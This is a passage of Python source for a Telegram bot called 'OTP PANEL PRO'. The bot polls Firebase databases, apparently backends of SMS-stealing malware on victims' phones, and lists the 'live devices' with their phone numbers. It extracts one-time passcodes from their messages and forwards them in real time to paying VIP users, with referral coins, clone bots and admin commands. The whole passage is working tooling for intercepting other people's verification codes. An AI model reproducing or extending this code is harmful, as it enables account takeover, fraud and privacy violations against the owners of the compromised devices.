                users_db[ref_id]["referrals"] += 1
                users_db[ref_id]["coins"] += 10
                try: await ctx.bot.send_message(ref_id, "🎉 New referral! +10 Coins added.")
                except: pass

        if is_main_bot and not users_db[chat_id].get("bonus_10_received"):
            users_db[chat_id]["bonus_10_received"] = True
            users_db[chat_id]["coins"] += 10
            try: await ctx.bot.send_message(chat_id, "🎁 <b>GIFT!</b> You received <b>10 Free Coins</b>!", parse_mode="HTML")
            except: pass

        if not users_db[chat_id].get("verified"):
            buttons = [[InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
            buttons.append([InlineKeyboardButton("✅ I Have Joined", callback_data="check_join")])
            await update.message.reply_text("🔒 <b>Verification Required</b>\nJoin the channels below:", 
                                            reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
            return

        chats_registry.setdefault(bot_token, set()).add(chat_id)
        await update.message.reply_text(
            f"✨ <b>OTP PANEL PRO EDITION</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
            f"Welcome, {user.first_name}! System is fully operational.\n"
            f"Use the premium menu below to navigate.",
            reply_markup=get_premium_main_menu(is_admin, bot_token), parse_mode="HTML")
    finally:
        unlock_user(chat_id)

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id, text = update.effective_chat.id, (update.message.text or "").strip()
    bot_token, is_main_bot = ctx.bot.token, (ctx.bot.token == TOKEN)
    
    if not check_and_lock_user(chat_id): return
        
    try:
        if not is_main_bot:
            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: return
            users_db, is_admin = CLONES[bot_token]["users"], (chat_id == CLONES[bot_token]["creator"])
        else:
            users_db, is_admin = all_users, (chat_id in ADMIN_IDS)

        if users_db.get(chat_id, {}).get("banned"): return

        # --- MAIN MENU ROUTING ---
        if text == "📱 Live Devices":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            if not is_vip(bot_token, chat_id):
                bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
                req_bot_coins = 20 + (bots_created * 10)
                await update.message.reply_text(
                    "🚫 <b>VIP Access Required!</b>\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. "
                    "Niche diye gaye button se coins earn karein ya VIP buy karein!",
                    reply_markup=get_vip_denied_keyboard(chat_id, req_bot_coins) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]),
                    parse_mode="HTML")
                return
            
            wait = await update.message.reply_text("⏳ <b>Processing...</b>\nFetching live devices.", parse_mode="HTML")
            devices = await get_all_devices(bot_token)
            online, offline = sum(1 for d in devices if d.status == "online"), len(devices) - sum(1 for d in devices if d.status == "online")
            header = f"✨ <b>OTP PANEL PRO</b> ✨\n━━━━━━━━━━━━━━━━━━━\n🟢 Online: {online}   🔴 Offline: {offline}\n📱 Total: {len(devices)} Devices\n━━━━━━━━━━━━━━━━━━━\nSelect a number to connect:"
            await wait.edit_text(header, reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
            return
            
        elif text == "🔍 Search Number":
            if not is_vip(bot_token, chat_id): 
                bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
                return await update.message.reply_text("🚫 VIP required.", reply_markup=get_vip_denied_keyboard(chat_id, 20+(bots_created*10)) if is_main_bot else None)
            pending_action[chat_id] = {"action": "search_number"}
            await update.message.reply_text("🔍 Enter minimum 4 digits to search:\n\n❌ Cancel: /cancel")
            return

        elif text == "💸 Refer & Earn" and is_main_bot:
            link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
            await update.message.reply_text(f"💸 <b>Refer & Earn</b>\n\n<code>{link}</code>\n\nShare to earn +10 coins per user!", parse_mode="HTML", disable_web_page_preview=True)
            return

        elif text.startswith("🤖 Create Your Bot") and is_main_bot:
            req = 20 + (users_db[chat_id].get('bots_created', 0) * 10)
            pending_action[chat_id] = {"action": "create_bot", "req_coins": req}
            await update.message.reply_text(f"🤖 <b>Create Clone Bot</b>\nCost: {req} 🪙\n\nSend Bot Token from @BotFather below:\n\n❌ Cancel: /cancel", parse_mode="HTML")
            return
            
        elif text.lower() == "/cancel":
            if pending_action.pop(chat_id, None): await update.message.reply_text("✅ Action cancelled.")
            else: await update.message.reply_text("ℹ️ No pending action.")
            return

        elif text == "🛡 Admin Panel" and is_admin:
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
            return

        # --- PENDING ACTIONS PROCESSING ---
        elif state := pending_action.get(chat_id):
            action = state["action"]
            pending_action.pop(chat_id)
            
            if action == "search_number":
                search_term = re.sub(r"\D", "", text)
                if len(search_term) < 4: 
                    await update.message.reply_text("⚠️ Need at least 4 digits.")
                    return
                wait = await update.message.reply_text("⏳ Searching devices...")
                devices = await get_all_devices(bot_token)
                found = [d for d in devices if any(search_term in num for num in d.numbers)]
                if not found: 
                    await wait.edit_text("📭 No matches found.")
                    return
                rows = [[InlineKeyboardButton(f"{'🟢' if d.status=='online' else '🔴'} 📱 [{' & '.join(d.numbers)}]", callback_data=f"sel:{d.id}")] for d in found[:10]]
                rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
                await wait.edit_text(f"🔍 Results for {search_term}", reply_markup=InlineKeyboardMarkup(rows))
                
            elif action == "broadcast_msg" and is_admin:
                targets = chats_registry.get(bot_token, set())
                wait = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)} users...")
                app = _main_app if is_main_bot else CLONES[bot_token].get("app")
                async def send(c):
                    if c == chat_id: return False
                    try: await app.bot.send_message(c, text, parse_mode="HTML"); return True
                    except: return False
                results = await asyncio.gather(*(send(c) for c in targets))
                sent = sum(1 for r in results if r)
                await wait.edit_text(f"📢 <b>BROADCAST DONE</b>\n✅ Sent: {sent}\n❌ Failed: {len(targets)-sent-1}", parse_mode="HTML")
                
            elif action == "create_bot" and is_main_bot:
                req_coins = state.get("req_coins", 20)
                if all_users[chat_id].get("coins", 0) < req_coins: 
                    await update.message.reply_text("❌ Insufficient coins.")
                    return
                if not re.match(r"^\d+:[A-Za-z0-9_-]+$", text): 
                    await update.message.reply_text("⚠️ Invalid token format.")
                    return
                wait = await update.message.reply_text("⏳ Building your bot...")
                try:
                    app = await start_clone_bot(text)
                    bot_info = await app.bot.get_me()
                    all_users[chat_id]["coins"] -= req_coins
                    all_users[chat_id]["bots_created"] = all_users[chat_id].get("bots_created", 0) + 1
                    CLONES[text] = {"creator": chat_id, "expiry": time.time() + 86400, "custom_db": None, "app": app, "users": {}, "username": bot_info.username}
                    await wait.edit_text(f"✅ Bot successfully created: @{bot_info.username}\nValid for 24h.")
                except Exception as e: await wait.edit_text(f"❌ Error: {e}")

        # Route Admin Commands
        elif text.startswith("/"):
            if is_admin:
                await handle_admin_command(update, ctx, text, chat_id, is_main_bot)

    finally:
        unlock_user(chat_id)

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query, chat_id, bot_token = update.callback_query, update.effective_chat.id, ctx.bot.token
    data, is_main_bot = query.data or "", bot_token == TOKEN

    if not check_and_lock_user(chat_id): 
        return await query.answer("⏳ Processing... Please wait", show_alert=False)

    try:
        if not is_main_bot:
            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: return await query.answer("Bot Disabled", show_alert=True)
            users_db, is_admin = CLONES[bot_token]["users"], chat_id == CLONES[bot_token]["creator"]
        else:
            users_db, is_admin = all_users, chat_id in ADMIN_IDS

        if users_db.get(chat_id, {}).get("banned"): return await query.answer("Action blocked.", show_alert=True)
        await query.answer()

        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "buy_vip" and is_main_bot:
            if users_db[chat_id].get("coins", 0) >= 20:
                users_db[chat_id]["coins"] -= 20
                users_db[chat_id]["vip_until"] = max(time.time(), users_db[chat_id].get("vip_until", 0)) + (10 * 3600)
                await safe_edit(query, "✅ <b>VIP Purchased!</b>\n\n10 Hours added. Click 'Live Devices' below to start.", parse_mode="HTML")
            else: await safe_edit(query, "❌ Insufficient coins. Refer friends to earn!")
            return

        elif data == "create_bot" and is_main_bot:
            req = 20 + (users_db[chat_id].get('bots_created', 0) * 10)
            pending_action[chat_id] = {"action": "create_bot", "req_coins": req}
            await safe_edit(query, f"🤖 <b>Create Clone Bot</b>\nCost: {req} 🪙\nSend Bot Token from @BotFather:\nCancel: /cancel", parse_mode="HTML")
            return

        elif data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await query.answer("⏳ Processing...", show_alert=False)
            devices = await get_all_devices(bot_token)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")

        elif data.startswith("pg:"):
            await query.answer("⏳ Processing...", show_alert=False)
            devices = await get_all_devices(bot_token)
            await safe_edit(query, device_list_header(devices, int(data[3:])), reply_markup=device_list_keyboard(devices, int(data[3:])), parse_mode="HTML")

        elif data == "online":
            await query.answer("⏳ Filtering...", show_alert=False)
            devices = await get_all_devices(bot_token)
            online = [d for d in devices if d.status == "online"]
            await safe_edit(query, f"🟢 <b>ONLINE NUMBERS ({len(online)})</b>\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")

        elif data.startswith("sel:"):
            dev_id = data[4:]
            devices = await get_all_devices(bot_token)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return await safe_edit(query, "❌ Device offline or not found.")
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            text = (f"📱 <b>CONNECTED</b>\n━━━━━━━━━━━━━━━━━━\nNumber: {device.numbers[0] if device.numbers else device.name[:10]}\n"
                    f"Battery: {parse_battery(device.battery)}%\nStatus: {device.status.upper()}\n━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Listening for LIVE OTPs...")
            await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{dev_id}")], [InlineKeyboardButton("🔙 Disconnect", callback_data="home")]]), parse_mode="HTML")

        elif data.startswith("msgs:"):
            dev_id = data[5:]
            devices = await get_all_devices(bot_token)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: return
            smss = await get_device_sms(device)
            if not smss: return await safe_edit(query, "📭 No messages found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]]))
            
            body_parts = []
            has_otp = False
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                date = sms_date(sms)
                sender = sms.get("sender") or "?"
                
                if otp:
                    has_otp = True
                    body_parts.append(f"🔑 <b>OTP:</b> <code>{otp}</code>\n👤 {sender} | 📅 {date}\n💬 {body}")
                else:
                    body_parts.append(f"📩 {sender} | 📅 {date}\n💬 {body}")

            if has_otp:
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            
            header = (f"📩 <b>MESSAGES LOG</b>\n━━━━━━━━━━━━━━━━━━\nNumber: {device.numbers[0] if device.numbers else device.name[:10]}\n"
                      f"Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n")
            
            full_text = header + ("\n━━━━━━━━━\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[more SMS available]"
            
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Device", callback_data=f"sel:{dev_id}")]])
            await safe_edit(query, full_text, reply_markup=kb, parse_mode="HTML")

        elif data == "check_join":
            users_db.setdefault(chat_id, {})["verified"] = True
            chats_registry.setdefault(bot_token, set()).add(chat_id)
            try: await query.message.delete()
            except: pass
            await ctx.bot.send_message(chat_id, "✅ <b>Verified!</b>", reply_markup=get_premium_main_menu(is_admin, bot_token), parse_mode="HTML")

        # Admin callbacks
        elif data == "admin_refresh" and is_admin:
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
        elif data == "admin_add_firebase" and is_admin and is_main_bot:
            pending_action[chat_id] = {"action": "add_firebase_main"}
            await safe_edit(query, "🔗 ADD DB URL:\nFormat: <code>Name: URL</code>\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        elif data == "add_custom_db" and not is_main_bot and is_admin:
            pending_action[chat_id] = {"action": "add_custom_db", "clone_token": bot_token}
            await safe_edit(query, "🔗 ADD CUSTOM FIREBASE URL:\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        elif data == "admin_users" and is_admin:
            lines = ["👥 User List (Top 50)\n━━━━━━━━━━━━━━━━━━\n"]
            for i, (uid, info) in enumerate(list(users_db.items())[:50], 1):
                icon = "🚫" if info.get("banned") else ("✅" if info.get("verified") else "⏳")
                lines.append(f"{i}. {icon} {user_display(info)}\n   ID: <code>{uid}</code> | OTPs: {info.get('otp_count', 0)}")
            text = "\n".join(lines)
            if len(text) > 4000: text = text[:4000] + "\n\n...[more users]"
            await safe_edit(query, text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))
        elif data == "admin_broadcast" and is_admin:
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await safe_edit(query, "📢 Send broadcast message:\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
        elif data == "admin_gift_coins" and is_admin:
            pending_action[chat_id] = {"action": "gift_coins_all"}
            await safe_edit(query, "🎁 Enter coins to send to all users:\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))

    finally:
        unlock_user(chat_id)

# ════════════════════════════════════════════════════════════
#  UNIVERSAL ADMIN COMMAND HANDLER (ALL COMMANDS & BULK)
# ════════════════════════════════════════════════════════════
async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE, text: str, chat_id: int, is_main_bot: bool) -> bool:
    parts = text.strip().split(maxsplit=2)
    cmd = parts[0].lower().split("@")[0]
    args = parts[1:] if len(parts) > 1 else []
    users_db = all_users if is_main_bot else CLONES[ctx.bot.token]["users"]
    bot_token = ctx.bot.token

    if cmd == "/help":
        help_text = (
            "🛡 <b>ADMIN COMMANDS</b>\n━━━━━━━━━━━━━━━━━━\n"
            "<b>💰 Coin Management</b>\n• <code>/all 50</code> — Give 50 coins to ALL\n"
            "• <code>/give USER_ID 100</code> — Give coins\n• <code>/take USER_ID 50</code> — Take coins\n"
            "• <code>/reset USER_ID</code> — Reset to 0\n• <code>/resetall</code> — Reset ALL\n"
            "• <code>/setcoin USER_ID 500</code> — Set exact coin value\n\n"
            "<b>👑 VIP Management</b>\n• <code>/vip USER_ID 24</code> — Grant 24h VIP\n"
            "• <code>/unvip USER_ID</code> — Remove VIP\n• <code>/vipall 12</code> — Grant VIP to all\n"
            "• <code>/vipinfo USER_ID</code> — Check VIP status\n\n"
            "<b>👥 User Management</b>\n• <code>/ban USER_ID</code> — Ban user\n"
            "• <code>/unban USER_ID</code> — Unban user\n• <code>/userinfo USER_ID</code> — Full info\n"
            "• <code>/stats</code> — Bot statistics\n• <code>/top</code> — Top 10 users\n\n"
            "<b>📢 Messaging & DB</b>\n• <code>/broadcast MSG</code> — Send to all\n"
            "• <code>/msg USER_ID MSG</code> — Send to one\n• <code>/adddb Name URL</code>\n"
            "• <code>/bulkadd</code> — Read from text.txt OR reply to a .txt file\n"
            "• <code>/listdb</code> — List DBs\n• <code>/count</code> — Count devices\n\n"
            "<b>🤖 Clone Management</b>\n• <code>/clones</code> — List clones\n• <code>/kill TOKEN</code> — Stop clone\n"
        )
        await update.message.reply_text(help_text, parse_mode="HTML")
        return True

    if cmd == "/bulkadd":
        content = ""
        if update.message.reply_to_message and update.message.reply_to_message.document:
            doc = update.message.reply_to_message.document
            if doc.file_name.endswith(".txt"):
                wait_msg = await update.message.reply_text("⏳ Downloading file...")
                new_file = await ctx.bot.get_file(doc.file_id)
                content_bytes = await new_file.download_as_bytearray()
                content = content_bytes.decode('utf-8', errors='ignore')
            else:
                await update.message.reply_text("⚠️ Please reply to a .txt file.")
                return True
        else:
            if not os.path.exists("text.txt"):
                await update.message.reply_text("❌ 'text.txt' not found on server, and no file was replied to.\n\nUpload a .txt file and reply to it with /bulkadd")
                return True
            wait_msg = await update.message.reply_text("⏳ Reading local text.txt...")
            with open("text.txt", "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

        urls = re.findall(r"https://[a-zA-Z0-9_-]+\.firebaseio\.com", content)
        if not urls:
            await wait_msg.edit_text("⚠️ No valid Firebase URLs found in the file.")
            return True
            
        existing_urls = set(u.rstrip('/') for u in DATABASES.values())
        added, skipped = 0, 0
        
        for url in urls:
            url = url.rstrip('/')
            if url in existing_urls:
                skipped += 1
                continue
            base_name = "DB"
            m = re.search(r"https?://([^\.]+)", url)
            if m:
                raw = m.group(1).replace("-default-rtdb", "")
                parts = [p.capitalize() for p in raw.split("-") if p]
                if len(parts) > 1 and len(parts[-1]) in (5, 6) and re.match(r"^[0-9a-fA-F]+$", parts[-1]):
                    parts.pop()
                base_name = "_".join(parts)
                
            name = base_name
            counter = 1
            while name in DATABASES:
                name = f"{base_name}_{counter}"
                counter += 1
                
            DATABASES[name] = url
            EXTRA_DBS[name] = url
            existing_urls.add(url)
            added += 1
            asyncio.create_task(fetch_db_data(name, url))
            
        await wait_msg.edit_text(f"✅ <b>BULK ADD COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n➕ Added: {added}\n⏭ Skipped (Duplicates): {skipped}\n🗄 Total DBs now: {len(DATABASES)}", parse_mode="HTML")
        await save_data_async()
        return True

    if cmd == "/all":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/all 50</code>", parse_mode="HTML")
            return True
        amount = int(args[0])
        wait = await update.message.reply_text(f"⏳ {len(users_db)} users ko {amount} coins bheje ja rahe hain...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        async def give_one(uid):
            users_db[uid]["coins"] = users_db[uid].get("coins", 0) + amount
            try:
                await app_to_use.bot.send_message(uid, f"🎁 <b>GIFT FROM ADMIN!</b> +{amount} Coins", parse_mode="HTML")
                return True
            except: return False
        results = await asyncio.gather(*(give_one(u) for u in list(users_db.keys())))
        sent = sum(1 for r in results if r)
        await wait.edit_text(f"✅ <b>SUCCESS!</b>\nSent: {sent}/{len(users_db)}", parse_mode="HTML")
        return True

    if cmd == "/give":
        if len(args) < 2 or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/give UID 10</code>", parse_mode="HTML")
            return True
        uid, amount = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["coins"] = users_db[uid].get("coins", 0) + amount
        await update.message.reply_text(f"✅ Added {amount} to <code>{uid}</code>", parse_mode="HTML")
        return True

    if cmd == "/take":
        if len(args) < 2 or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/take UID 10</code>", parse_mode="HTML")
            return True
        uid, amount = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["coins"] = max(0, users_db[uid].get("coins", 0) - amount)
        await update.message.reply_text(f"✅ Deducted {amount} from <code>{uid}</code>", parse_mode="HTML")
        return True

    if cmd == "/reset":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/reset UID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["coins"] = 0
        await update.message.reply_text(f"✅ Reset <code>{uid}</code> to 0", parse_mode="HTML")
        return True

    if cmd == "/resetall":
        for uid in users_db: users_db[uid]["coins"] = 0
        await update.message.reply_text("✅ ALL users reset to 0.")
        return True

    if cmd == "/setcoin":
        if len(args) < 2 or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/setcoin UID VALUE</code>", parse_mode="HTML")
            return True
        uid, val = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["coins"] = val
        await update.message.reply_text(f"✅ Set <code>{uid}</code> to {val}", parse_mode="HTML")
        return True

    if cmd == "/vip":
        if len(args) < 2 or not args[1].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/vip UID HOURS</code>", parse_mode="HTML")
            return True
        uid, hours = int(args[0]), int(args[1])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        current = users_db[uid].get("vip_until", 0.0)
        users_db[uid]["vip_until"] = max(time.time(), current) + hours * 3600
        await update.message.reply_text(f"✅ VIP {hours}h to <code>{uid}</code>", parse_mode="HTML")
        return True

    if cmd == "/unvip":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/unvip UID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["vip_until"] = 0.0
        await update.message.reply_text(f"✅ VIP removed from <code>{uid}</code>", parse_mode="HTML")
        return True

    if cmd == "/vipall":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/vipall HOURS</code>", parse_mode="HTML")
            return True
        hours = int(args[0])
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        for uid in users_db:
            users_db[uid]["vip_until"] = max(time.time(), users_db[uid].get("vip_until", 0.0)) + hours * 3600
            try: await app_to_use.bot.send_message(uid, f"👑 <b>VIP GIFTED!</b> {hours}h free! 🎉", parse_mode="HTML")
            except: pass
        await update.message.reply_text(f"✅ VIP {hours}h sent to ALL.", parse_mode="HTML")
        return True

    if cmd == "/vipinfo":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/vipinfo UID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ Not found.")
            return True
        left = users_db[uid].get("vip_until", 0.0) - time.time()
        await update.message.reply_text(f"Status: {'✅ ' + get_vip_time_left(bot_token, uid) if left > 0 else '❌ Not VIP'}")
        return True

    if cmd == "/ban":
        if not args or not args[0].lstrip("-").isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/ban UID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["banned"] = True
        await update.message.reply_text(f"✅ Banned {uid}")
        return True

    if cmd == "/unban":
        if not args or not args[0].lstrip("-").isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/unban UID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        users_db[uid]["banned"] = False
        await update.message.reply_text(f"✅ Unbanned {uid}")
        return True

    if cmd == "/userinfo":
        if not args or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/userinfo UID</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        if uid not in users_db:
            await update.message.reply_text("❌ User not found.")
            return True
        info = users_db[uid]
        await update.message.reply_text(f"👤 <code>{uid}</code>\n📛 {info.get('name')}\n💰 {info.get('coins')}\n📩 {info.get('otp_count')} OTPs", parse_mode="HTML")
        return True

    if cmd == "/stats":
        total_users = len(users_db)
        vip_users = sum(1 for u in users_db.values() if u.get("vip_until", 0) > time.time())
        total_devices = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        await update.message.reply_text(f"📊 <b>STATS</b>\nUsers: {total_users}\nVIPs: {vip_users}\nDevices: {total_devices}\nDBs: {len(DATABASES)}", parse_mode="HTML")
        return True

    if cmd == "/top":
        sorted_users = sorted(users_db.items(), key=lambda x: x[1].get("otp_count", 0), reverse=True)
        lb = "🏆 <b>TOP USERS</b>\n"
        for i, (uid, info) in enumerate(sorted_users[:10], 1):
            lb += f"{i}. {info.get('name')} — {info.get('otp_count',0)} OTPs\n"
        await update.message.reply_text(lb, parse_mode="HTML")
        return True

    if cmd == "/broadcast":
        msg = " ".join(args)
        targets = chats_registry.get(bot_token, set())
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        for cid in targets:
            try: await app_to_use.bot.send_message(cid, msg, parse_mode="HTML")
            except: pass
        await update.message.reply_text("📢 Broadcast Complete.")
        return True

    if cmd == "/msg":
        if len(args) < 2 or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/msg UID Message</code>", parse_mode="HTML")
            return True
        uid, msg = int(args[0]), args[1]
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        try:
            await app_to_use.bot.send_message(uid, f"📨 <b>ADMIN MESSAGE</b>\n\n{msg}", parse_mode="HTML")
            await update.message.reply_text("✅ Sent.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        return True

    if cmd == "/adddb":
        if len(args) < 2:
            await update.message.reply_text("⚠️ Usage: <code>/adddb Name URL</code>", parse_mode="HTML")
            return True
        name, url = args[0], args[1]
        DATABASES[name] = url
        EXTRA_DBS[name] = url
        try:
            devs = await fetch_db_data(name, url)
            GLOBAL_DEVICE_CACHE[name] = devs
            await update.message.reply_text(f"✅ Added {name} with {len(devs)} devices.")
            await save_data_async()
        except Exception as e:
            await update.message.reply_text(f"⚠️ Added, but error: {e}")
        return True

    if cmd == "/listdb":
        txt = "🗄 <b>DATABASES</b>\n"
        for n, u in DATABASES.items():
            txt += f"• {n} ({len(GLOBAL_DEVICE_CACHE.get(n, []))} devs)\n"
        await update.message.reply_text(txt, parse_mode="HTML")
        return True

    if cmd == "/count":
        total = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        online = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == "online")
        await update.message.reply_text(f"📱 <b>TOTAL DEVICES:</b> {total}\n🟢 Online: {online}", parse_mode="HTML")
        return True

    if cmd == "/clones":
        txt = "🤖 <b>CLONE BOTS</b>\n"
        for t, d in list(CLONES.items())[:20]:
            txt += f"@{d.get('username','?')} | Creator: {d.get('creator')}\n"
        await update.message.reply_text(txt or "No clones.", parse_mode="HTML")
        return True

    if cmd == "/kill":
        if not args:
            await update.message.reply_text("⚠️ Usage: <code>/kill TOKEN</code>", parse_mode="HTML")
            return True
        token = args[0]
        if token in CLONES:
            try:
                await CLONES[token]["app"].updater.stop()
                await CLONES[token]["app"].stop()
                await CLONES[token]["app"].shutdown()
            except: pass
            del CLONES[token]
            await update.message.reply_text("✅ Killed.")
        else:
            await update.message.reply_text("❌ Not found.")
        return True

    return False

# ════════════════════════════════════════════════════════════
#  POLLING ENGINE (FIREBASE -> TELEGRAM)
# ════════════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    label = device.numbers[0] if device.numbers else device.name[:10]
    otp = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}")]
    ])
    
    send_tasks = []
    for bot_token, chat_dict in user_focus.items():
        if bot_token != TOKEN:
            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
            app_to_use = CLONES[bot_token].get("app")
            users_db = CLONES[bot_token]["users"]
        else:
            app_to_use = _main_app
            users_db = all_users
            
        if not app_to_use: continue
        target_chats = [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]
        for chat_id in target_chats:
            if otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
    
    if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)

async def poll_single_db(tag: str, url: str) -> None:
    try:
        r_main, r_user, r_root = await asyncio.gather(
            fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url))
        
        devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
        device_map = {d.id: d for d in devices_in_db}
        
        for bulk_data in (r_main, r_user, r_root):
            if not isinstance(bulk_data, dict): continue
            for dev_id, sms_dict in bulk_data.items():
                if not isinstance(sms_dict, dict): continue
                device = device_map.get(dev_id)
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = f"{dev_id}/{k}"
                    if sk in seen_ids: continue
                    seen_ids.add(sk)
                    if device: asyncio.create_task(_forward_sms(device, sms))

        # Type 4 Support
        type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
        for d in type4_devs:
            sms_dict = await fb_get(d.sms_path, d.base_url)
            if isinstance(sms_dict, dict):
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = f"{d.id}/{k}"
                    if sk in seen_ids: continue
                    seen_ids.add(sk)
                    asyncio.create_task(_forward_sms(d, sms))
    except Exception: pass

async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            dbs = dict(DATABASES)
            for t, d in CLONES.items():
                if time.time() < d["expiry"] and d.get("custom_db"): dbs[f"C_{t[:6]}"] = d["custom_db"]
            
            fetch_tasks = [fetch_db_data(tag, url) for tag, url in dbs.items()]
            results = await asyncio.gather(*fetch_tasks, return_exceptions=True)
            for i, tag in enumerate(dbs.keys()):
